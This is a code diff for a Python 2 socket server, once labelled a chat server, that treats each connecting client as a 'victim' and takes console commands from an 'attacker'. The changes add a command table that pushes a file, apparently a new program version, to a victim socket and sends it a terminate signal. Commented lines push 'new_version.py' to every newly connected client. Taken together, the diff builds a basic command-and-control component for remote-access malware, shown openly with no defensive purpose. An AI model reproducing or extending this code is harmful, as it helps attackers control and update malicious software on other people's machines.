@@ -1,11 +1,7 @@
-"""
-chat - server side - deliver the messages to clients
-"""
-
 import socket
 import select
-import sys
 import msvcrt
+import os
 
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 2005
@@ -18,20 +14,29 @@ KEY_BACKSPACE = 8
 open_client_sockets = []
 messages_to_send = []
 action_message = []
+mode = None
 
 
 def update_version(socket, command_message):
     list_arg = command_message.split(';')
-    socket.send(list_arg[0])
+    socket.send("{commnd_code};{file_size}".format(commnd_code=list_arg[0], file_size=os.path.getsize(list_arg[1])))
     with open(list_arg[1], 'rb') as file_to_send:
         bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)
         while bytes_to_send:
             socket.send(bytes_to_send)
-            print('Sent ', repr(bytes_to_send))
+            print 'Sent ', repr(bytes_to_send)
             bytes_to_send = file_to_send.read(SOCKET_RECV_BYTES)
+
+    socket.send('')
+    print("done")
+
+
+def terminate(socket, command_message):
+    socket.send('0')
 
 
 command_dict = {
+    0: terminate,
     4: update_version
 }
 
@@ -62,7 +67,7 @@ def handle_attacker_command(victim_list):
             print '[Attacker]', command_message
             command_id = get_command_id(command_message)
             if command_id in command_dict:
-                command_dict(victim_list, command_message)
+                command_dict[command_id](victim_list[0], command_message)
             else:
                 for wsocket in victim_list:
                     wsocket.send('[{}] {}'.format(wsocket.getpeername()[PORT_INDEX], action_message))
@@ -91,25 +96,29 @@ def main():
                     (new_socket, address) = server_socket.accept()
                     print 'New victim {0} !'.format(address)
                     open_client_sockets.append(new_socket)
+                    # update_version(new_socket, '4;new_version.py')
+                    # terminate(new_socket, '0')
                 else:
                     try:
                         print '.....New data from client.....'
                         data = current_socket.recv(SOCKET_RECV_BYTES)
-                        print (current_socket, data)
-
-                        # response = manipulate_data(data)
-                        # current_socket.send(response)
-
+                        if data == "":
+                            open_client_sockets.remove(current_socket)
+                            print "Connection with client closed."
+                        else:
+                            print (current_socket, data)
+                            # response = manipulate_data(data)
+                            # current_socket.send(response)
 
                     except Exception as e:
                         if current_socket in open_client_sockets:
                             open_client_sockets.remove(current_socket)
-                        print 'Exception occurred in receive, value:', e.message
+                        print 'Exception occurred in receive, value:', e
 
             handle_attacker_command(wlist)
 
     except Exception as e:
-        print 'Exception occurred, value:', e.message
+        print 'Exception occurred, value:', e
     finally:
         server_socket.close()
         print 'server connection is closed'
